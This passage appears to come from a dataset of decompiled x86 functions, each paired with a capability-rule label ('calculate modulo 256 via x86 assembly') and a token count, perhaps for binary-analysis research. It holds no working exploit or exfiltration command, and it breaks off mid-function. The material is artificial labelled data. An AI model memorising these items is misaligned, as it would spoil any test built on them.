        "decompiled_code": "\nvoid __fastcall fcn.00464070(uint param_1, char **param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    bool bVar4;\n    char **in_stack_ffffffc8;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_9h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x46416f;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    uVar1 = *in_EAX;\n    if ((uVar1 == 0) || (0x40 < uVar1)) {\n        puStack36 = &stack0xfffffffc;\n        fcn.0040675c();\n        fcn.00460bd8();\n    }\n    else {\n        uVar2 = in_EAX + 2 & 0xffffff00;\n        if ((in_EAX[1] & 0x3f) != 0) {\n            uVar2 = 0;\n        }\n        uVar2 = uVar2 | (in_EAX[1] & 0x80) != 0;\n        uVar3 = uVar1 == (in_EAX[1] & 0x3f);\n        in_stack_ffffffc8 = param_2;\n        fcn.00463f28(param_2);\n        bVar4 = **param_2 == '-';\n        if (((bVar4) || (bVar4 = **param_2 == '0',  bVar4)) &&\n           ((fcn.004049d4(in_stack_ffffffc8, uVar3, uVar2),  bVar4 ||\n            ((fcn.004049d4(in_stack_ffffffc8, uVar3, uVar2),  bVar4 ||\n             (fcn.004049d4(in_stack_ffffffc8, uVar3, uVar2),  bVar4)))))) {\n            fcn.0040461c();\n        }\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    fcn.004045c8(0x464176);\n    return;\n}\n",
        "token_count": 517
    },
    "004641b4": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nuint8_t fcn.004641b4(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + 1) & 0x3f;\n}\n",
        "token_count": 41
    },
    "00470184": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00470184(uint param_1, char param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint var_20h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0046f6d8();\n    fcn.0046e7bc();\n    *(in_EAX + 0xec) = 0xf;\n    puVar3 = 0x47020c;\n    puVar4 = &var_20h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    puVar1 = &var_20h + (**0x4847fc >> 3);\n    *puVar1 = *puVar1 | '\\x01' << (**0x4847fc & 7);\n    puVar3 = &var_20h;\n    puVar4 = in_EAX + 0x9c;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack64;\n    }\n    return in_EAX;\n}\n",
        "token_count": 418
    },
    "00471460": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00471460(uint param_1, char param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint var_20h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0046f6d8();\n    fcn.0046e7bc();\n    (**(*in_EAX + 0xc4))();\n    puVar3 = 0x4714ec;\n    puVar5 = &var_20h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    puVar1 = &var_20h + (**0x4847fc >> 3);\n    *puVar1 = *puVar1 | '\\x01' << (**0x4847fc & 7);\n    piVar4 = &var_20h;\n    piVar6 = in_EAX + 0x27;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar6 = *piVar4;\n        piVar4 = piVar4 + 1;\n        piVar6 = piVar6 + 1;\n    }\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack64;\n    }\n    return in_EAX;\n}\n",
        "token_count": 435
    },
    "00471a90": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00471a90(uint param_1, char param_2)\n\n{\n    uint8_t *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *puVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    int32_t *piVar6;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint var_20h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0046f6d8();\n    fcn.0046e7bc();\n    (**(*in_EAX + 0xc4))();\n    puVar3 = 0x471b34;\n    puVar5 = &var_20h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    puVar1 = &var_20h + (**0x4847fc >> 3);\n    *puVar1 = *puVar1 | '\\x01' << (**0x4847fc & 7);\n    piVar4 = &var_20h;\n    piVar6 = in_EAX + 0x27;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar6 = *piVar4;\n        piVar4 = piVar4 + 1;\n        piVar6 = piVar6 + 1;\n    }\n    fcn.004045c8();\n    fcn.004045c8();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack64;\n    }\n    return in_EAX;\n}\n",
        "token_count": 454
    },
    "004801f4": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_8ch\n// WARNING: Variable defined which should be unmapped: var_88h\n// WARNING: Variable defined which should be unmapped: var_84h\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Variable defined which should be unmapped: var_7ch\n// WARNING: Variable defined which should be unmapped: var_78h\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: var_70h\n// WARNING: Variable defined which should be unmapped: var_6ch\n// WARNING: Variable defined which should be unmapped: var_110h\n// WARNING: Variable defined which should be unmapped: var_10ch\n// WARNING: Variable defined which should be unmapped: var_108h\n// WARNING: Variable defined which should be unmapped: var_104h\n// WARNING: Variable defined which should be unmapped: var_100h\n// WARNING: Variable defined which should be unmapped: var_fch\n// WARNING: Variable defined which should be unmapped: var_f8h\n// WARNING: Variable defined which should be unmapped: var_f4h\n// WARNING: Variable defined which should be unmapped: var_f0h\n// WARNING: Variable defined which should be unmapped: var_ech\n// WARNING: Variable defined which should be unmapped: var_e8h\n// WARNING: Variable defined which should be unmapped: var_e4h\n// WARNING: Variable defined which should be unmapped: var_e0h\n// WARNING: Variable defined which should be unmapped: var_dch\n// WARNING: Variable defined which should be unmapped: var_d8h\n// WARNING: Variable defined which should be unmapped: var_d4h\n// WARNING: Variable defined which should be unmapped: var_d0h\n// WARNING: Variable defined which should be unmapped: var_cch\n// WARNING: Variable defined which should be unmapped: var_c8h\n// WARNING: Variable defined which should be unmapped: var_c4h\n// WARNING: Variable defined which should be unmapped: var_c0h\n// WARNING: Variable defined which should be unmapped: var_bch\n// WARNING: Variable defined which should be unmapped: var_b8h\n// WARNING: Variable defined which should be unmapped: var_b4h\n// WARNING: Variable defined which should be unmapped: var_b0h\n// WARNING: Variable defined which should be unmapped: var_ach\n// WARNING: Variable defined which should be unmapped: var_a8h\n// WARNING: Variable defined which should be unmapped: var_a4h\n// WARNING: Variable defined which should be unmapped: var_a0h\n// WARNING: Variable defined which should be unmapped: var_9ch\n// WARNING: Variable defined which should be unmapped: var_98h\n// WARNING: Variable defined which should be unmapped: var_94h\n// WARNING: Variable defined which should be unmapped: var_114h\n// WARNING: Variable defined which should be unmapped: var_134h\n// WARNING: Variable defined which should be unmapped: var_130h\n// WARNING: Variable defined which should be unmapped: var_12ch\n// WARNING: Variable defined which should be unmapped: var_128h\n// WARNING: Variable defined which should be unmapped: var_124h\n// WARNING: Variable defined which should be unmapped: var_120h\n// WARNING: Variable defined which should be unmapped: var_11ch\n// WARNING: Variable defined which should be unmapped: var_118h\n// WARNING: Variable defined which should be unmapped: var_138h\n// WARNING: Variable defined which should be unmapped: var_188h\n// WARNING: Variable defined which should be unmapped: var_184h\n// WARNING: Variable defined which should be unmapped: var_180h\n// WARNING: Variable defined which should be unmapped: var_17ch\n// WARNING: Variable defined which should be unmapped: var_178h\n// WARNING: Variable defined which should be unmapped: var_174h\n// WARNING: Variable defined which should be unmapped: var_170h\n// WARNING: Variable defined which should be unmapped: var_16ch\n// WARNING: Variable defined which should be unmapped: var_168h\n// WARNING: Variable defined which should be unmapped: var_164h\n// WARNING: Variable defined which should be unmapped: var_160h\n// WARNING: Variable defined which should be unmapped: var_15ch\n// WARNING: Variable defined which should be unmapped: var_158h\n// WARNING: Variable defined which should be unmapped: var_154h\n// WARNING: Variable defined which should be unmapped: var_150h\n// WARNING: Variable defined which should be unmapped: var_14ch\n// WARNING: Variable defined which should be unmapped: var_148h\n// WARNING: Variable defined which should be unmapped: var_144h\n// WARNING: Variable defined which should be unmapped: var_140h\n// WARNING: Variable defined which should be unmapped: var_13ch\n// WARNING: Variable defined which should be unmapped: var_18ch\n// WARNING: Variable defined which should be unmapped: var_20ch\n// WARNING: Variable defined which should be unmapped: var_208h\n// WARNING: Variable defined which should be unmapped: var_204h\n// WARNING: Variable defined which should be unmapped: var_200h\n// WARNING: Variable defined which should be unmapped: var_1fch\n// WARNING: Variable defined which should be unmapped: var_1f8h\n// WARNING: Variable defined which should be unmapped: var_1f4h\n// WARNING: Variable defined which should be unmapped: var_1f0h\n// WARNING: Variable defined which should be unmapped: var_1ech\n// WARNING: Variable defined which should be unmapped: var_1e8h\n// WARNING: Variable defined which should be unmapped: var_1e4h\n// WARNING: Variable defined which should be unmapped: var_1e0h\n// WARNING: Variable defined which should be unmapped: var_1dch\n// WARNING: Variable defined which should be unmapped: var_1d8h\n// WARNING: Variable defined which should be unmapped: var_1d4h\n// WARNING: Variable defined which should be unmapped: var_1d0h\n// WARNING: Variable defined which should be unmapped: var_1cch\n// WARNING: Variable defined which should be unmapped: var_1c8h\n// WARNING: Variable defined which should be unmapped: var_1c4h\n// WARNING: Variable defined which should be unmapped: var_1c0h\n// WARNING: Variable defined which should be unmapped: var_1bch\n// WARNING: Variable defined which should be unmapped: var_1b8h\n// WARNING: Variable defined which should be unmapped: var_1b4h\n// WARNING: Variable defined which should be unmapped: var_1b0h\n// WARNING: Variable defined which should be unmapped: var_1ach\n// WARNING: Variable defined which should be unmapped: var_1a8h\n// WARNING: Variable defined which should be unmapped: var_1a4h\n// WARNING: Variable defined which should be unmapped: var_1a0h\n// WARNING: Variable defined which should be unmapped: var_19ch\n// WARNING: Variable defined which should be unmapped: var_198h\n// WARNING: Variable defined which should be unmapped: var_194h\n// WARNING: Variable defined which should be unmapped: var_190h\n// WARNING: Variable defined which should be unmapped: var_210h\n// WARNING: Variable defined which should be unmapped: var_280h\n// WARNING: Variable defined which should be unmapped: var_27ch\n// WARNING: Variable defined which should be unmapped: var_278h\n// WARNING: Variable defined which should be unmapped: var_274h\n// WARNING: Variable defined which should be unmapped: var_270h\n// WARNING: Variable defined which should be unmapped: var_26ch\n// WARNING: Variable defined which should be unmapped: var_268h\n// WARNING: Variable defined which should be unmapped: var_264h\n// WARNING: Variable defined which should be unmapped: var_260h\n// WARNING: Variable defined which should be unmapped: var_25ch\n// WARNING: Variable defined which should be unmapped: var_258h\n// WARNING: Variable defined which should be unmapped: var_254h\n// WARNING: Variable defined which should be unmapped: var_250h\n// WARNING: Variable defined which should be unmapped: var_24ch\n// WARNING: Variable defined which should be unmapped: var_248h\n// WARNING: Variable defined which should be unmapped: var_244h\n// WARNING: Variable defined which should be unmapped: var_240h\n// WARNING: Variable defined which should be unmapped: var_23ch\n// WARNING: Variable defined which should be unmapped: var_238h\n// WARNING: Variable defined which should be unmapped: var_234h\n// WARNING: Variable defined which should be unmapped: var_230h\n// WARNING: Variable defined which should be unmapped: var_22ch\n// WARNING: Variable defined which should be unmapped: var_228h\n// WARNING: Variable defined which should be unmapped: var_224h\n// WARNING: Variable defined which should be unmapped: var_220h\n// WARNING: Variable defined which should be unmapped: var_21ch\n// WARNING: Variable defined which should be unmapped: var_218h\n// WARNING: Variable defined which should be unmapped: var_214h\n// WARNING: Variable defined which should be unmapped: var_284h\n// WARNING: Variable defined which should be unmapped: var_2e4h\n// WARNING: Variable defined which should be unmapped: var_2e0h\n// WARNING: Variable defined which should be unmapped: var_2dch\n// WARNING: Variable defined which should be unmapped: var_2d8h\n// WARNING: Variable defined which should be unmapped: var_2d4h\n// WARNING: Variable defined which should be unmapped: var_2d0h\n// WARNING: Variable defined which should be unmapped: var_2cch\n// WARNING: Variable defined which should be unmapped: var_2c8h\n// WARNING: Variable defined which should be unmapped: var_2c4h\n// WARNING: Variable defined which should be unmapped: var_2c0h\n// WARNING: Variable defined which should be unmapped: var_2bch\n// WARNING: Variable defined which should be unmapped: var_2b8h\n// WARNING: Variable defined which should be unmapped: var_2b4h\n// WARNING: Variable defined which should be unmapped: var_2b0h\n// WARNING: Variable defined which should be unmapped: var_2ach\n// WARNING: Variable defined which should be unmapped: var_2a8h\n// WARNING: Variable defined which should be unmapped: var_2a4h\n// WARNING: Variable defined which should be unmapped: var_2a0h\n// WARNING: Variable defined which should be unmapped: var_29ch\n// WARNING: Variable defined which should be unmapped: var_298h\n// WARNING: Variable defined which should be unmapped: var_294h\n// WARNING: Variable defined which should be unmapped: var_290h\n// WARNING: Variable defined which should be unmapped: var_28ch\n// WARNING: Variable defined which should be unmapped: var_288h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.004801f4 noreturn (void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uchar uVar6;\n    uint var_2e4h;\n    uint var_2e0h;\n    uint var_2dch;\n    uint var_2d8h;\n    uint var_2d4h;\n    uint var_2d0h;\n    uint var_2cch;\n    uint var_2c8h;\n    uint var_2c4h;\n    uint var_2c0h;\n    uint var_2bch;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    int32_t iVar7;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 0x5e;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_20h = 0x482429;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_24h;\n    var_14h = unaff_ESI;\n    fcn.0040461c();\n    fcn.00404948(0x48247c, 0, 0, 0, 0, 0x48246c, 0, 0, 0, 0, 0x48245c, 0, 0, 0, 0, 0x482450, *0x486034);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.00404948(0x482494, 0, 0, 0, 0, 0, 0x482488, *0x486034, var_4h);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047eed8();\n    fcn.0040461c();\n    iVar3 = sub.uRL_AutodialHookCallback(0);\n    iVar7 = 0;\n    iVar4 = fcn.004031c8();\n    bVar5 = iVar4 >> 0x1f == iVar7;\n    uVar6 = bVar5 && iVar4 == iVar3;\n    if (bVar5 && iVar4 == iVar3) {\n        fcn.0040461c();\n    }\n    else {\n        fcn.0040461c();\n    }\n    fcn.00404948(0x48250c, 0, 0, 0x482500, 0, 0, 0x4824dc, 0, 0, 0x4824f4, 0, 0, 0x4824e8, 0, 0, 0x4824dc, 0, 0, \n                 0x482494, 0, 0, 0x4824dc, 0, 0, 0x4824d0, 0, 0, 0x4824c4, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(var_14h);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    uVar1 = *0x486048;\n    fcn.00404948(0x4824d0, 0x482548, *0x486048, 0x48253c, 0x482530, 0x482524, 0x482518, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(var_24h);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    uVar2 = *0x486048;\n    fcn.00404948(0x4824d0, 0, 0, 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, 0x482560, 0, 0, 0x4824e8, 0, 0, \n                 0x482554, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x48250c, 0, 0, 0x482500, 0, 0, 0x4824dc, 0, 0, 0x4824f4, 0, 0, 0x4824e8, 0, 0, 0x4824dc, 0, 0, \n                 0x482494, 0, 0, 0x4824dc, 0, 0, 0x4824d0, 0, 0, 0x4824c4, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x48259c, 0, 0, 0x48250c, 0, 0, 0x482590, 0, 0, 0x482584, 0, 0, 0x482578, 0, 0, 0x4824d0, 0, 0, \n                 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, *0x486048, *0x48604c);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x48246c);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.0040461c();\n    fcn.0047eaf8();\n    fcn.00409150();\n    fcn.00408a4c();\n    fcn.0040461c();\n    fcn.004048d4();\n    fcn.004049d4();\n    if (!uVar6) {\n        fcn.004048d4();\n        fcn.004049d4();\n        if (!uVar6) {\n    // WARNING: Subroutine does not return\n            sub.kernel32.dll_ExitProcess_1(0);\n        }\n    }\n    fcn.00404948(0x48250c, 0, 0, 0x482500, 0, 0, 0x4824dc, 0, 0, 0x4824f4, 0, 0, 0x4824e8, 0, 0, 0x4824dc, 0, 0, \n                 0x482494, 0, 0, 0x4824dc, 0, 0, 0x4824d0, 0, 0, 0x4824c4, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x4825d8, 0, 0, 0x4824d0, 0, 0, 0x4824dc, 0, 0, 0x48259c, 0, 0, 0x482494, 0, 0, 0x48256c, 0, 0, \n                 0x4824d0, 0, 0, 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x48250c, 0, 0, 0x482500, 0, 0, 0x4824dc, 0, 0, 0x4824f4, 0, 0, 0x4824e8, 0, 0, 0x4824dc, 0, 0, \n                 0x482494, 0, 0, 0x4824dc, 0, 0, 0x4824d0, 0, 0, 0x4824c4, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x4825d8, 0, 0, 0x4824d0, 0, 0, 0x4824dc, 0, 0, 0x48259c, 0, 0, 0x482494, 0, 0, 0x48256c, 0, 0, \n                 0x4824d0, 0, 0, 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x4824d0, 0x482548, *0x486048, 0x48253c, 0x482530, 0x482524, 0x482518, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x48259c, 0, 0, 0x48250c, 0, 0, 0x482590, 0, 0, 0x482584, 0, 0, 0x482578, 0, 0, 0x4824d0, 0, 0, \n                 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, *0x486048, *0x48604c);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x482494);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x4824d0, 0x482548, *0x486048, 0x48253c, 0x482530, 0x482524, 0x482518, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.0040461c();\n    fcn.00404948(0x48259c, 0, 0, 0x48250c, 0, 0, 0x482590, 0, 0, 0x482584, 0, 0, 0x482578, 0, 0, 0x4824d0, 0, 0, \n                 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, *0x486048, *0x48604c);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.004047c0();\n    fcn.00404948(0x482604, 0, 0, 0, 0, 0, 0, 0, 0, 0x482610, 0, 0, 0, 0, 0, 0, 0, 0, 0x4824d0, 0, 0, 0, 0, 0, 0, 0, 0, \n                 0x48250c, 0, 0, 0, 0, 0, 0, 0, 0, 0x48250c, 0, 0, 0, 0, 0, 0, 0, 0, 0x48259c, 0, 0, 0, 0, 0, 0, 0, 0, \n                 0x482560, 0, 0, 0, 0, 0, 0, 0, 0, 0x482604, 0, 0, 0, 0, 0, 0, 0, 0, 0x482494, 0, 0, *0x48605c, 0x482604\n                 , 0x4824dc);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047eed8();\n    fcn.00404948(0x4824d0, 0x482548, *0x486048, 0x48253c, 0x482530, 0x482524, 0x482518, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x482500);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x48259c, 0, 0, 0x48250c, 0, 0, 0x482590, 0, 0, 0x482584, 0, 0, 0x482578, 0, 0, 0x4824d0, 0, 0, \n                 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, *0x486048, *0x48604c);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.004047c0();\n    fcn.004047c0(0x482530);\n    fcn.0047eed8();\n    fcn.00404948(0x4824d0, 0x482548, *0x486048, 0x48253c, 0x482530, 0x482524, 0x482518, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(uVar1);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x48259c, 0, 0, 0x48250c, 0, 0, 0x482590, 0, 0, 0x482584, 0, 0, 0x482578, 0, 0, 0x4824d0, 0, 0, \n                 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, *0x486048, *0x48604c);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(uVar2);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x48250c, 0, 0, 0x482500, 0, 0, 0x4824dc, 0, 0, 0x4824f4, 0, 0, 0x4824e8, 0, 0, 0x4824dc, 0, 0, \n                 0x482494, 0, 0, 0x4824dc, 0, 0, 0x4824d0, 0, 0, 0x4824c4, 0, 0, 0, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0x4824e8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x4824d0, 0, 0, 0x4824e8, 0, 0, 0x482560, 0, 0, 0x48256c, 0, 0, 0x482560, 0, 0, 0x4824e8, 0, 0, \n                 0x482554, *0x486048, 0x4824b8);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.004048d4(0);\n    fcn.00404a88();\n    fcn.004047c0();\n    fcn.0047ed3c();\n    fcn.00404948(0x4824d0, 0x482548, *0x486048, 0x48253c, 0x482530, 0x482524, 0x482518, *0x486048, 0x4824b8);\n    